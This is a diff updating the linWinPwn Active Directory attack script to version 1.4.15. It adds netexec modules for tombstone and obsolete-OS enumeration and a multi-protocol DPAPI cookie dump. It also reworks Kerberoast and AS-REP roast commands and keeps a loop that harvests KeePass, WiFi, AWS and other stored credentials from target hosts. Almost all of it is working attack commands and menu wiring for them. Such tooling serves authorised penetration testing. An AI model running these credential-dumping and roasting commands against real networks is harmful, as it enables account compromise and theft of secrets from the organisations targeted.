@@ -183,7 +183,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.14 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.15 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -1570,7 +1570,7 @@ ne_ldap_enum() {
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --pass-pol --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_ldappasspol_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Entra ID Sync Server${NC}"
-    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --entra-id-sync --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_entra_id_sync_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M entra-id --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_entra_id_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -2247,6 +2247,12 @@ ne_dns_nonsecure() {
     echo -e ""
 }
 
+ne_tombstone_enum() {
+    echo -e "${BLUE}[*] Tombstone Enumeration using netexec${NC}"
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M tombstone --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_tombstone_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+}
+
 ###### adcs_enum: ADCS Enumeration
 ne_adcs_enum() {
     mkdir -p "${ADCS_dir}"
@@ -2307,8 +2313,9 @@ certipy_enum() {
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
             run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
-            #run_command "${netexec} ${ne_verbose} ldap ${curr_targets_list} "${argument_ne}" -M certipy-find --log ${ADCS_dir}/certipy_netexec_output_${dc_domain}.txt"
+            #run_command "${netexec} ${ne_verbose} ldap ${curr_targets_list} "${argument_ne}" -M certipy-find -o JSON=true --log ${ADCS_dir}/certipy_netexec_output_${dc_domain}.txt"
             run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
+            #run_command "${netexec} ${ne_verbose} ldap ${curr_targets_list} "${argument_ne}" -M certipy-find -o VULN=true -o ENABLED=true -o JSON=true --log ${ADCS_dir}/certipy_netexec_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -3082,7 +3089,7 @@ asrep_attack() {
         else
             run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
             run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
-            #run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --asreproast --log ${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
+            #run_command "${netexec} ${ne_verbose} ldap ${curr_targets_list} ${argument_ne} --asreproast --log ${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
         fi
         if grep -q 'error' "${Kerberos_dir}/asreproast_output_${dc_domain}.txt"; then
             echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
@@ -3168,7 +3175,7 @@ kerberoast_attack() {
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
             run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee "${Kerberos_dir}/kerberoast_list_output_${dc_domain}.txt"
             run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" >"${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
-            #run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
+            #run_command "${netexec} ${ne_verbose} ldap ${curr_targets_list} ${argument_ne} --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
             if grep -q 'error' "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
             elif [ "${noexec_bool}" == "false" ]; then
@@ -3638,6 +3645,12 @@ print_check() {
 webdav_check() {
     echo -e "${BLUE}[*] WebDAV check ${NC}"
     run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M webdav --log ${Vulnerabilities_dir}/ne_webdav_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+}
+
+obsolete_enum() {
+    echo -e "${BLUE}[*] Enumerating obsolete operating systems from LDAP using netexec${NC}"
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M obsolete --kdcHost ${dc_FQDN} --log ${Vulnerabilities_dir}/ne_obsolete_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -5205,7 +5218,7 @@ set_gmsa_membership() {
 
 ###### pwd_dump: Password Dump
 juicycreds_dump() {
-    echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
+    echo -e "${BLUE}[*] Search for juicy credentials: KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
     for i in $(cat "${curr_targets_list}"); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover -M rdcman -M teams_localdb -M wifi -M winscp -M snipped -M powershell_history -M mremoteng -M iis -M vnc -M eventlog_creds -M notepad++ -M notepad -M aws-credentials --log ${Credentials_dir}/keepass_discover_${user_var}_${i}.txt" 2>&1
@@ -5409,9 +5422,26 @@ dpapi_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
     else
+        echo -e "${CYAN}[*] Choose protocol for DPAPI dump (default: smb):${NC}"
+        echo -e "${YELLOW}1) smb${NC}"
+        echo -e "${YELLOW}2) wmi${NC}"
+        echo -e "${YELLOW}3) mssql${NC}"
+        echo -e "${YELLOW}4) winrm${NC}"
+        echo -e ""
+        read -rp ">> " dpapi_protocol </dev/tty
+        dpapi_protocol="${dpapi_protocol:-1}"
+        
+        case ${dpapi_protocol} in
+            1|smb) proto="smb" ;;
+            2|wmi) proto="wmi" ;;
+            3|mssql) proto="mssql" ;;
+            4|winrm) proto="winrm" ;;
+            *) proto="smb" ;;
+        esac
+        
         for i in $(cat "${curr_targets_list}"); do
-            echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
-            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${Credentials_dir}/dpapi_dump_${user_var}_${i}.txt" 2>&1
+            echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec (${proto}) ${NC}"
+            run_command "${netexec} ${ne_verbose} ${proto} ${i} ${argument_ne} --dpapi cookies --log ${Credentials_dir}/dpapi_dump_${user_var}_${i}.txt" 2>&1
         done
     fi
     echo -e ""
@@ -6098,7 +6128,7 @@ ad_menu() {
         check_tool_status "${netexec}" "MS-RPC Users Enumeration using netexec" "5"
         check_tool_status "${netexec}" "Password policy Enumeration using netexec" "6"
         check_tool_status "${netexec}" "LDAP Users Enumeration using netexec" "7"
-        check_tool_status "${netexec}" "LDAP Enumeration using netexec (passnotreq, userdesc, maq, subnets, passpol)" "8"
+        check_tool_status "${netexec}" "LDAP Enumeration using netexec (passnotreq, userdesc, maq, subnets, passpol, entra-id)" "8"
         check_tool_status "${impacket_findDelegation}" "Delegation Enumeration using findDelegation and netexec" "9"
         check_tool_status "${bloodyad}" "bloodyAD All Enumeration" "10"
         check_tool_status "${bloodyad}" "bloodyAD write rights Enumeration" "11"
@@ -6129,6 +6159,7 @@ ad_menu() {
         check_tool_status "${powerview_py}" "Open PowerView.py Console" "36"
         check_tool_status "${ghostspn}" "Scan for GhostSPN" "37"
         check_tool_status "${netexec}" "Check DNS zones allowing nonsecure dynamic updates using netexec" "38"
+        check_tool_status "${netexec}" "Enumeration of deleted objects (Tombstone) using netexec" "39"
         echo -e "back) Go back"
         echo -e "exit) Exit"
 
@@ -6297,6 +6328,10 @@ ad_menu() {
 
         38)
             ne_dns_nonsecure
+            ;;
+
+        39)
+            ne_tombstone_enum
             ;;
 
         back)
@@ -7272,6 +7307,7 @@ vulns_menu() {
         check_tool_status "${netexec}" "Drop LNK, Library-MS and SC (on writeable share)" "18"
         check_tool_status "${netexec}" "onelogon check using netexec (only on DC)" "19"
         check_tool_status "${netexec}" "Enumerate common (useful) CVEs using netexec" "20"
+        check_tool_status "${netexec}" "Enumerate obsolete operating systems from LDAP using netexec" "21"
         echo -e "back) Go back"
         echo -e "exit) Exit"
 
@@ -7364,6 +7400,10 @@ vulns_menu() {
 
         20)
             netexec_enum_cve
+            ;;
+
+        21)
+            obsolete_enum
             ;;
 
         back)
